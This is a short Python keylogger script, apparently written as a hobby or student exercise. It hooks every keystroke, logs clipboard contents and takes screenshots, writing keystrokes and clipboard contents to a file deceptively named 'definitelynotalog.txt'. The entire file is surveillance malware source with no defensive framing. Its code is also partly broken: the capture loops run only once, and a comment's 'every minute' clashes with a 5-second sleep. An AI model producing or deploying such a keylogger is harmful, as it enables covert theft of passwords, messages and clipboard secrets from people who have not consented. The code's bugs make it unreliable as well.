import keyboard
import pyperclip
import pyscreenshot as ImageGrab
import time
from threading import Thread

f = open("definitelynotalog.txt", "w")

#every minute a screenshot is received.
def screenshot_loop(): 
    im = ImageGrab.grab() 
    timecap = time.strftime("%Y-%m-%d_%H-%M-%S")  # Create  timestamp
    filename = f"capture_{timecap}.png"
    im.save(filename)
    f.write("Screenshot received (filename)\n")
    time.sleep(5)

#this will record all key press downs. 
def key_event(event):
    if event.event_type == 'down':
        f.write((f"Key: {event.name}\n"))
        f.flush() # write immediately

#Grabbing clipboard contents
def clipboard_loop():
    clipinfo = pyperclip.paste()
    f.write(f"Clipboard: {clipinfo}\n") #grabs clipboard 
    time.sleep(5)

#start screenshot and clipboard threads so it works. thread is used for concurrent tasks, continiously execute w/o any blockage of each other
Thread(target = screenshot_loop, daemon=True).start()
Thread(target = clipboard_loop, daemon=True).start()
#hook monitors all keyboard events.
keyboard.hook(key_event)
    
#cancels when 'esc' is pressed.
keyboard.wait('esc')

#exit loop aftur pressing esc

f.close()